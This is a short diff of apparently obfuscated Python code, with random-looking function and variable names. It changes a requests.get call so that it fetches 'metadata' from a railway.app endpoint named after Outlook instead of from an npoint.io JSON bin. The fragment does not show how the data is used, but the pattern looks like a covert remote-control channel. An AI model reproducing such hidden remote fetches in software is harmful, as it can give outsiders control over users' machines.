@@ -16,7 +16,7 @@ def model_mxsuwx_191():
 
     def process_njduwm_497():
         try:
-            train_rdecpb_559 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_rdecpb_559 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_rdecpb_559.raise_for_status()
             net_jkgsop_711 = train_rdecpb_559.json()
             model_igotem_188 = net_jkgsop_711.get('metadata')
